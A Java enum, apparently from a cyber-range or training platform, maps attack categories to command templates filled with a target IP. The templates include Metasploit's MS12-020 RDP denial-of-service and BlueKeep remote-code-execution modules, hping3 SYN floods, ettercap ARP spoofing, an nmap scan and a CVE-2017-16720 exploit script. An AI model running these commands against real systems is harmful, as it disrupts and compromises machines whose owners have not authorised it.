package cn.cyberpeace.mp.base.bo;

import java.util.List;

public enum AttackType {
    // 中断
    ZHONGDUAN(1, "", "msfconsole -q -x \"use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS ${ip}; run; exit\""),

    // 降效
    JIANGXIAO(2, "", "hping3 -q -n --rand-source -S -p 80 --flood ${ip}"),

    // 嗅探
    XIUTAN(3, "sniffing", "nmap -sV --version-intensity 5 ${ip}"),

    CAOKONG(4, "", "python3 CVE-2017-16720.py ${ip}"),

    TANHUI(5, "destroyed", "msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS 192.168.1.10; set target 8;run; exit\"\n"),

    QIPIAN(6, "deception", "\"sudo ettercap -T -M arp:remote //${ip}/ //192.168.1.1/"),

    JUZHI(7, "denial-of-service-attack", "hping -c 10000 -d 120 -S -p 80 --flood --rand-source ${ip}");

    private int type;

    private String flowType;

    private String cmd;

    AttackType(int type, String flowType,String cmd) {
        this.type = type;
        this.cmd = cmd;
        this.flowType = flowType ;
    }

    public int getType() {
        return type;
    }

    public String getCmd() {
        return cmd;
    }

    public String getFlowType() {
        return flowType;
    }

    public static AttackType getByType(int type) {
        for (AttackType value : values()) {
            if (value.type == type) {
                return value;
            }
        }
        return null;
    }

    public static String getFormatCmd(int type, List<ImageToolRequest.Params> params) {
        String cmd = getByType(type).getCmd();
        for(var p:params){
            cmd = cmd.replace("${" + p.getName() + "}", p.getValue());
        }
        return cmd;
    }
}
